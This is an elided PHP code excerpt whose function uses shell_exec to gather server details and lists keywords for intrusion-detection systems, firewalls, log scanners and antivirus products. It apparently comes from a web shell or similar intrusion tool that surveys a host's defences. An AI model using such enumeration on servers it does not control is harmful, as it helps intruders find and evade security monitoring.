...
// Compatibility function for http_response_code() for PHP < 5.4
...
function getServerInfoDetails() {
    ...
    if (!$is_windows && is_callable_shell_func('shell_exec')) {
        ...
        $generic_keywords = array(
            'HIDS/IPS' => array('snort', 'suricata', 'tripwire', 'aide', 'bro', 'zeek'),
            'Firewall' => array('iptables', 'ufw', 'firewalld', 'ipfw', 'shorewall', 'portsentry'),
            'Log Scanners' => array('fail2ban', 'denyhosts', 'logwatch', 'logcheck'),
            'Antivirus' => array('avg', 'kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'sophos')
        );
        if($ps_output){
